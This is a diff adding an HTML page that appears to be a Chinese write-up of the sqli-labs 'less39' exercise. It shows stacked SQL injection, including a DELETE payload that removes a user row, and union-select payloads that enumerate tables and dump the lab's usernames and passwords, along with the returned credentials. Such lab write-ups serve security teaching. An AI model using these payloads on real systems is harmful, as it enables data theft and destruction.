@@ -1,0 +1,38 @@
+<hr>
+<h2 id="title-less39url-https-www-yuque-com-u29002979-ep2zrx-zf0xrhdes1enqu02"><a href="#title-less39url-https-www-yuque-com-u29002979-ep2zrx-zf0xrhdes1enqu02" class="headerlink" title="title: less39url: https://www.yuque.com/u29002979/ep2zrx/zf0xrhdes1enqu02"></a>title: less39<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/zf0xrhdes1enqu02">https://www.yuque.com/u29002979/ep2zrx/zf0xrhdes1enqu02</a></h2><pre><code class="bash">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+/* execute multi query */
+if (mysqli_multi_query($con1, $sql))
+</code></pre>
+<p>注入方式为<strong>数字型注入</strong>，依旧存在<strong>堆叠注入</strong>  。</p>
+<p><a name="s6XR3"></a></p>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>利用堆叠注入,<strong>删除</strong>上一关卡我们增添的数据&amp;#x20;<br><code>?id=1;**delete** from users where username=&#39;duidie&#39;--+</code></p>
+<p>查询看是否存在 发现’duidie’这条数据的账户和密码都没有了 &amp;#x20;<br><code>?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p>
+<blockquote>
+<p>Your Username is : 2<br>Your Password is : Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456</p>
+</blockquote>
+<p><a name="bzYh1"></a></p>
+<h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1&#39;</code></p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>数字型注入。</p>
+<p><a name="PF74E"></a></p>
+<h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><pre><code class="bash">判断字段数 
+?id=1 order by 4--+ 
+?id=1 order by 3--+
+
+找回显点
+?id=-1 union select 1,2,3--+  
+
+爆破数据库名称
+?id=-1 union select 1,2,database()--+
+
+爆破数据库表名称
+?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+
+
+爆破字段名称
+?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+
+
+爆破字段内容
+?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)--+
+</code></pre>
